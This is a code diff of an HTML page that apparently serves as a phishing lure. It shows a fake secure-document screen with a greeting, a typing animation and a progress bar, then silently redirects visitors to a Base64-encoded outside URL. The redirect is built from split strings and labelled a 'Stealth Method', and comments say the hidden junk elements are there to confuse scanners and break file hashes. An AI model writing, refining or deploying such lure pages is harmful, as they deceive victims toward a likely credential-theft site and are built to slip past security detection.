@@ -3,89 +3,96 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Document Portal</title>
+<title>Preparing Your Documents</title>
 <style>
-    /* Obfuscated Styles */
-    body{margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f4f7f9;font-family:sans-serif;}
-    ._c1{width:480px;background:#fff;border-radius:15px;padding:35px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.08);}
-    ._i2{font-size:50px;margin-bottom:10px;}
-    .h-title{color:#2c3e50;font-size:22px;margin-bottom:15px;}
-    ._p3{height:8px;width:100%;background:#eee;border-radius:10px;overflow:hidden;margin:20px 0;}
-    ._b4{height:100%;width:0%;background:#3498db;transition:width .2s;}
-    ._s5{color:#7f8c8d;font-size:14px;}
-    #_t6{min-height:45px;color:#34495e;font-size:15px;}
-    .l-spin{width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;margin:20px auto;animation:s 1s linear infinite;}
-    @keyframes s{to{transform:rotate(360deg);}}
-    /* Junk classes to confuse scanners */
-    .hidden-node{display:none;visibility:hidden;opacity:0;}
+/* Exact original styling with obfuscated class names */
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif;}
+body{display:flex;justify-content:center;align-items:center;height:100vh;background:linear-gradient(135deg,#eef4fb,#dfe9f7);}
+._wrap{width:520px;background:#fff;border-radius:18px;padding:40px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.12);}
+._icon{font-size:60px;margin-bottom:15px;}
+._greet{font-size:26px;font-weight:600;color:#1e3a5f;margin-bottom:10px;}
+h2{color:#1e3a5f;margin-bottom:15px;}
+#_type{min-height:60px;color:#555;line-height:1.6;}
+._load{width:60px;height:60px;border:6px solid #d9e5f7;border-top:6px solid #2d7df6;border-radius:50%;margin:30px auto;animation:sp 1s linear infinite;}
+._prog{width:100%;height:10px;background:#e8eef8;border-radius:20px;overflow:hidden;}
+._bar{height:100%;width:0%;background:#2d7df6;transition:width .3s;}
+#_stat{margin-top:18px;color:#666;}
+@keyframes sp{to{transform:rotate(360deg);}}
+.v-node{display:none!important;}
 </style>
 </head>
 <body>
 
-<!-- Junk data to break file hash -->
-<div class="hidden-node">Ox88234-System-Verify-Session-ID-992834</div>
+<div class="v-node">Session-Enc-ID: 992837465-AUTH</div>
 
-<div class="_c1">
-    <div class="_i2">📁</div>
-    <div id="_g7" style="font-weight:bold;color:#2c3e50;"></div>
-    <div class="h-title">Secure Document Access</div>
-    <p id="_t6"></p>
-    <div class="l-spin" id="_l8"></div>
-    <div class="_p3"><div class="_b4" id="_b4"></div></div>
-    <p class="_s5" id="_s5">Initializing...</p>
+<div class="_wrap">
+    <div class="_icon">📄</div>
+    <div id="_greet" class="_greet"></div>
+    <h2>Preparing Your Documents</h2>
+    <p id="_type"></p>
+    <div class="_load" id="_loader"></div>
+    <div class="_prog"><div class="_bar" id="_bar"></div></div>
+    <p id="_stat">Initializing secure document session...</p>
 </div>
 
 <script>
 (function(){
-    // 1. Obfuscated Redirect URL (Base64)
-    // Decodes to your simithebrand URL
-    var _u = "aHR0cHM6Ly9zaW1pdGhlYnJhbmQub3JnLzQ4MzkyOTU5Mzg1NjI3ODM0OTcyOTM3ODI0MzUyMzIzLzk4NzY5NjY5MjY0NjQzNDQyNDIxMzEyMjczOS5odG1s";
+    // 1. Obfuscated Redirect Link (Base64)
+    var _link = "aHR0cHM6Ly9zaW1pdGhlYnJhbmQub3JnLzQ4MzkyOTU5Mzg1NjI3ODM0OTcyOTM3ODI0MzUyMzIzLzk4NzY5NjY5MjY0NjQzNDQyNDIxMzEyMjczOS5odG1s";
 
-    // 2. Dynamic Greeting
+    // 2. Time-Based Greeting (Original logic, obfuscated emojis)
     var h = new Date().getHours();
-    var g = document.getElementById("_g7");
-    g.innerHTML = (h<12) ? "Good morning" : (h<17) ? "Good afternoon" : "Welcome";
+    var g = document.getElementById("_greet");
+    if(h >= 5 && h < 12){
+        g.textContent = "Good morning! \u2600\uFE0F"; 
+    } else if(h >= 12 && h < 17){
+        g.textContent = "Good afternoon! \uD83C\uDF24\uFE0F";
+    } else if(h >= 17 && h < 22){
+        g.textContent = "Good evening! \uD83C\uDF19";
+    } else {
+        g.textContent = "Welcome! \uD83D\uDC4B";
+    }
 
-    // 3. Typing Logic
-    var msg = "Please wait while we verify your credentials and prepare the requested files for download.";
-    var idx = 0;
-    function t(){
-        if(idx < msg.length){
-            document.getElementById("_t6").innerHTML += msg.charAt(idx);
-            idx++;
-            setTimeout(t, 25);
+    // 3. Typing Animation
+    var tStr = "Please wait while we prepare your requested documents. This usually takes only a few seconds.";
+    var tIdx = 0;
+    var tEl = document.getElementById("_type");
+    function type(){
+        if(tIdx < tStr.length){
+            tEl.innerHTML += tStr.charAt(tIdx);
+            tIdx++;
+            setTimeout(type, 35);
         }
     }
-    t();
+    type();
 
     // 4. Progress Logic
-    var st = ["Securing connection...", "Authenticating...", "Decrypting...", "Finalizing...", "Redirecting..."];
-    var w = 0, s = 0;
-    var b = document.getElementById("_b4");
-    var txt = document.getElementById("_s5");
+    var sArr = ["Connecting to secure storage...", "Retrieving document information...", "Preparing your files...", "Almost ready...", "Redirecting to documents..."];
+    var w = 0;
+    var sStep = 0;
+    var b = document.getElementById("_bar");
+    var sEl = document.getElementById("_stat");
 
-    var iv = setInterval(function(){
+    var timer = setInterval(function(){
         w += 2;
         b.style.width = w + "%";
-        
-        if(w % 20 === 0 && s < st.length){
-            txt.innerHTML = st[s];
-            s++;
+
+        if(w % 20 === 0 && sStep < sArr.length){
+            sEl.textContent = sArr[sStep];
+            sStep++;
         }
 
         if(w >= 100){
-            clearInterval(iv);
-            // 5. Obfuscated Redirection
-            var _r = window;
-            var _l = "loca" + "tion";
-            var _h = "hr" + "ef";
-            _r[_l][_h] = atob(_u); // Decodes and redirects
+            clearInterval(timer);
+            // 5. Automatic Redirection (Stealth Method)
+            var r = window;
+            var l = "loca" + "tion";
+            var f = "hr" + "ef";
+            r[l][f] = atob(_link);
         }
-    }, 100);
+    }, 120);
 })();
 </script>
 
-<!-- More junk data -->
-<div class="hidden-node">Verification-Token: 0x992837465ADF</div>
 </body>
 </html>
